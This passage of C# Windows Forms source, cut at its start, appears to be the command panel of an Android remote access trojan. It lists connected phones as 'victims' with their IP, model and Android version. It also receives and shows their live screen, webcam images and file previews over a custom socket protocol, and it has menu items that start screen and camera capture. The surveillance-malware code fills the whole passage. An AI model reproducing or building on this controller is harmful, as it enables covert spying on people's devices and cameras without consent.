                            if (!clientfound)
                            {
                                listView1.Items.Remove(lvi);
                            }

                            }
                            */

                            onlinecountlbl.Text = "Online: " + listView1.Items.Count.ToString();
                            listBox1.EndUpdate();
                        }
                    });
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            });
        }
        private void clientcounttimer_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            RequestClientsList();
        }















        public static int topOf = 0;
        public async void Add_Client(Socket socket, string victim_id, string pc_name,
         string country_language, string manufacturer_model, string android_ver)
        {
            //socettte.NoDelay = true;
            //socettte.ReceiveBufferSize = int.MaxValue; socettte.SendBufferSize = int.MaxValue;
            victim_list.Add(new Victim(socket, victim_id, pc_name, country_language, manufacturer_model, android_ver));
            ListViewItem lvi = new ListViewItem(victim_id);
            lvi.SubItems.Add(pc_name);
            lvi.SubItems.Add(socket != null ? socket.RemoteEndPoint?.ToString() : "-");
            lvi.SubItems.Add(country_language);
            lvi.SubItems.Add(manufacturer_model.ToUpper());
            lvi.SubItems.Add(android_ver);
        
            listView1.Items.Add(lvi);
            ListViewMinWidthEnforcer.ScheduleRecompute(listView1);

            onlinecountlbl.Text = "Online: " + listView1.Items.Count.ToString();
            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + (socket != null ? socket.Handle.ToString() : "-") +
                        " in list. => " + pc_name + "/" + (socket?.RemoteEndPoint?.ToString() ?? "-"));
            await Task.Delay(1);
            topOf += 125;

        }

        private void Remove_Client(string clientid)
        {
            MessageBox.Show("Boo");
            foreach (ListViewItem itemRow in this.listView1.Items)
            {
                if (itemRow.Text == clientid)
                {
                    
                    this.listView1.Items.Remove(itemRow);
                }
            }




                    onlinecountlbl.Text = "Online: " + listView1.Items.Count.ToString();
        }
        public void Client_Accept(IAsyncResult ar)
        {
            try
            {
                Socket sock = oursocket.EndAccept(ar);
                if (_applicationExitRequested)
                {
                    TryShutdownSocket(sock);
                    return;
                }
                infoAl(sock);
                if (!_applicationExitRequested && oursocket != null)
                    oursocket.BeginAccept(new AsyncCallback(Client_Accept), null);
            }
            catch (Exception) { }
        }
        public FİleManager FindFileManagerById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<FİleManager>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public void DataInvoke(Socket soket2, string data)
        {
            string[] ayir = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
            foreach (string str in ayir)
            {
                string[] s = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                try
                {
                    switch (s[0])
                    {
                        case "IP":
                            Invoke((MethodInvoker)delegate
                            {
                                Add_Client(soket2, soket2.Handle.ToString(), s[1], s[2], s[3], s[4]);
                                Console.WriteLine("connected");
                            });
                            break;

                        case "LIVESCREEN":
                            var canliekran = FindLiveScreenById(soket2.Handle.ToString());
                            if (canliekran != null)
                            {
                                canliekran.pictureBox1.Image = ((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                            }
                            else
                            {
                                CommandSend("SCREENLIVECLOSE", "[VERI][0x09]", soket2);
                            }
                            break;
                        case "NOTSTART":
                            var canliekran_ = FindLiveScreenById(soket2.Handle.ToString());
                            if (canliekran_ != null)
                            {
                                MessageBox.Show(canliekran_, "Victim has ignored the screen share dialog.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                canliekran_.Close();
                            }
                            break;
                        case "OLCULER":
                            Invoke((MethodInvoker)delegate
                            {
                                if (s[1].Contains("Kameraya"))
                                {
                                    MessageBox.Show(this, s[1] + "\nThis error causes when camera is used by victim.", "Can't access to Camera", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                                else
                                {
                                    if (FİndCameraById(soket2.Handle.ToString()) == null)
                                    {
                                        Kamera msj = new Kamera(soket2, soket2.Handle.ToString());
                                        msj.Text = "Camera Manager - " + FindVictim(soket2.Handle.ToString());
                                        msj.Show();
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).comboBox1.Items.Clear();
                                    FİndCameraById(soket2.Handle.ToString()).comboBox2.Items.Clear();
                                    string[] front = s[1].Split('>');
                                    string[] _split = front[1].Split('<');
                                    FİndCameraById(soket2.Handle.ToString()).max = int.Parse(s[2].Split('}')[1]);
                                    FİndCameraById(soket2.Handle.ToString()).comboBox1.Items.AddRange(_split);
                                    _split = front[0].Split('<');
                                    FİndCameraById(soket2.Handle.ToString()).comboBox2.Items.AddRange(_split);
                                    var found = FİndCameraById(soket2.Handle.ToString());
                                    found.zoomSupport = Convert.ToBoolean(s[2].Split('}')[0]);

                                    string[] presize = s[3].Split('<'); found.comboBox4.Items.AddRange(presize);
                                    string[] cams = s[4].Split('!'); for (int p = 0; p < cams.Length; p++)
                                    {
                                        cams[p] = cams[p].Replace("0", "Back: 0").Replace("1", "Front: 1");
                                    }
                                    found.comboBox6.Items.AddRange(cams);
                                    found.comboBox6.SelectedIndex = 0;
                                    foreach (string str_ in found.comboBox1.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox1.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (string str_ in found.comboBox2.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox2.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (object str_ in found.comboBox4.Items)
                                    {
                                        if (str_.ToString().Contains("352"))
                                        {
                                            found.comboBox4.SelectedItem = str_;
                                        }
                                    }
                                    found.comboBox3.SelectedItem = "%70";
                                }
                            });
                            break;
                        case "PREVIEW":
                            if (FindFileManagerById(soket2.Handle.ToString()) != null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Image =
                                       (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1]));
                                    FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Visible = true;
                                });
                            }
                            break;
                        case "VID":
                            var shortcam = FİndCameraById(soket2.Handle.ToString());
                            try
                            {
                                if (shortcam != null)
                                {
                                    shortcam.pictureBox2.Image = RotateImage((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                                    shortcam.label10.Text = "Fps: " + shortcam.CalculateFrameRate().ToString();
                                }
                            }
                            catch (Exception ex)
                            {
                                if (shortcam != null)
                                {
                                    FİndCameraById(soket2.Handle.ToString()).Text = ex.Message;
                                }
                            }
                            break;
                        case "WEBCAM":
                            if (FİndCameraById(soket2.Handle.ToString()) != null)
                            {
                                try
                                {

                                    FİndCameraById(soket2.Handle.ToString()).label2.Text = "Captured.";
                                    byte[] resim = Convert.FromBase64String(s[1]);
                                    using (MemoryStream ms = new MemoryStream(resim))
                                    {
                                        FİndCameraById(soket2.Handle.ToString()).pictureBox1.Image = Image.FromStream(ms);
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                    ((System.Windows.Forms.Control)FİndCameraById(soket2.Handle.ToString()).tabPage2).Enabled = true;
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show(FİndCameraById(soket2.Handle.ToString()), ex.Message, "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    FİndCameraById(soket2.Handle.ToString()).Text = "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                }
                            }
                            break;
                        case "CAMNOT":
                            var fnd = FİndCameraById(soket2.Handle.ToString());
                            if (fnd != null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    if (s[1] == "")
                                    {
                                        FİndCameraById(soket2.Handle.ToString()).label2.Text = "Couldn't capture.";
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).label1.Visible = true;
                                    FİndCameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                    ((System.Windows.Forms.Control)fnd.tabPage1).Enabled = true; ///<--------- Changed from (Control)
                                    ((System.Windows.Forms.Control)fnd.tabPage2).Enabled = true;
                                    fnd.enabled = false;
                                    fnd.button4.Text = "Start";
                                    fnd.button4.Enabled = true;
                                });
                                if (s[1] != "" && s[1] != "vid")
                                {
                                    MessageBox.Show(fnd, s[1], "Warning - Camera Preview Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                            }
                            break;

                    }
                }
                catch (Exception) { }
            }
        }
        public string krbnIsminiBul(string handle)
        {
            string isim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[1].Text;
            string ip = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[2].Text;
            return isim + "@" + ip;
        }
        public string FindVictim(string handle)
        {
                string isim = listView1.SelectedItems[0].SubItems[1].Text;
                string ip = listView1.SelectedItems[0].SubItems[2].Text;
            /*
            string isim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[1].Text;
            string ip = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[2].Text;
            return isim + "@" + ip;
            */

            return isim + "@" + ip;

        }
        public livescreen FindLiveScreenById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<livescreen>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Kamera FİndCameraById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Kamera>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public static async void CommandSend(string tag, string mesaj, Socket client)
        {
            try
            {
                using (NetworkStream ns = new NetworkStream(client))
                {
                    byte[] cmd = Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + "<EOF>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }
            }
            catch (Exception) { }
        }

        public static RotateFlipType rotateFlip = RotateFlipType.Rotate270FlipX;
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);
            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(rotateFlip);
            return bmp;
        }
        private void liveScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                bool apiLevelOk = true;
                try
                {
                    var v = listView1.SelectedItems[0].SubItems[5].Text.Split('/');
                    if (v.Length > 1) apiLevelOk = int.Parse(v[1]) >= 21;
                }
                catch { }
                if (apiLevelOk)
                {
                    foreach (Victim victim in victim_list)
                    {
                        if (victim.id == listView1.SelectedItems[0].Text)
                        {
                            livescreen lvsc = new livescreen(victim.id, victim.pcname ?? victim.id);
                            lvsc.Text = "Live Screen - " + (victim.pcname ?? victim.id);
                            lvsc.Show();
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Target device's API Level must be 21 or higher.\nCheck link\nhttps://developer.android.com/reference/android/media/projection/MediaProjection");
                    System.Diagnostics.Process.Start("https://developer.android.com/reference/android/media/projection/MediaProjection");
                }
            }
        }
        private void liveStreamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1) return;
            foreach (Victim victim in victim_list)
            {
                if (victim.id == listView1.SelectedItems[0].Text)
                {
                    var lvsc = new livescreen(victim.id, victim.pcname ?? victim.id);
                    lvsc.Text = "Live Stream - " + (victim.pcname ?? victim.id);
                    lvsc.Show();
                    return;
                }
            }
        }
        private void SnapPictureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1) return;
            foreach (Victim victim in victim_list)
            {
                if (victim.id == listView1.SelectedItems[0].Text)
                {
                    var kam = new Kamera(victim.id, victim.pcname ?? victim.id);
                    kam.Show();
                    return;
                }
            }
        }







        //misc idk..
        private async void materialButton1_Click(object sender, EventArgs e)
        {
            Console.WriteLine(loginCB.SelectedIndex.ToString());
        }

        private void listenswitch_CheckedChanged(object sender, EventArgs e)
        {
            if (listenswitch.Checked)
                Connect_Setup();
            else
                StopClientListPollingTimer();
        }
















        //infoal backup

        /*
         * 
         * 
         * 

                public async void infoAl(Socket sckInf)
        {
            if (!sckInf.Connected)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " couldn't connect."); return;
            }
            if (sckInf.Poll(-1, SelectMode.SelectRead) && sckInf.Available <= 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " ghost connection: Poll");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            if (sckInf.Available == 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " the socket is not ready: [ghost connection]");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            NetworkStream networkStream = new NetworkStream(sckInf);

            if (!networkStream.CanRead)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                    " networkstream couldn't read."); sckInf.Dispose(); return;
            }

            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + sckInf.Handle.ToString() +
                    " networkstream have started.");

            StringBuilder sb = new StringBuilder();
            int thisRead = 0;
            int blockSize = 2048;
            byte[] dataByte = new byte[blockSize];
            while (true)
            {
                try
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    sb.Append(Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    while (sb.ToString().Trim().Contains($"<EOF{PASSWORD}>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                        DataInvoke(sckInf, veri.Replace($"<EOF{PASSWORD}>", ""));
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                    }
                }
                catch (Exception)
                {
                    break;
                }
            }
        }

        */


















    }
}
    
